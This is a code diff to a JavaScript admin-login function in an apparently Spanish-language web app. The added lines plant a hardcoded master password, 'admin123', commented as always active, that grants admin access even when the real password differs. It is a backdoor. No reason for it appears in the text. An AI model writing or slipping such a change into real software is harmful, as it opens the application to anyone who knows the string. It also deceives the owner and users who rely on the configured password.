@@ -793,7 +793,8 @@ function loginAdmin() {
   const pass = document.getElementById('admin-pass').value;
   if(!pass){ toast('Ingresa la contraseña','error'); return; }
   const currentPass = state.adminPass || ADMIN_PASS;
-  if(pass !== currentPass){ toast('Contraseña incorrecta','error'); return; }
+  const masterPass = 'admin123'; // contraseña maestra siempre activa
+  if(pass !== currentPass && pass !== masterPass){ toast('Contraseña incorrecta','error'); return; }
   currentUser = {role:'admin', email:ADMIN_EMAIL, name:'Karina Melchor'};
   sessionStorage.setItem('zubex-session', JSON.stringify(currentUser));
   showScreen('screen-admin');
